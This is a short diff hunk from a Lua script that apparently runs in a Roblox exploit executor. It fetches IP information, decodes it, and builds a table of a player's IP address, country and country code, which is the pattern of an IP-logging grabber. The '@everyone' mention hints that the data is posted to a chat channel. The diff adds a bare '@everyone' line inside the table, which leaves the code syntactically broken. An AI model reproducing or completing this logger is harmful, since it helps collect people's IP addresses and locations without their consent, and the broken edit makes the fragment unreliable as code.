@@ -13,6 +13,7 @@ local getIPInfo = syn.request({
 })
 local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
 local FI = {
+    @everyone
     IP = IPBuffer,
     country = IIT.country,
     countryCode = IIT.countryCode,
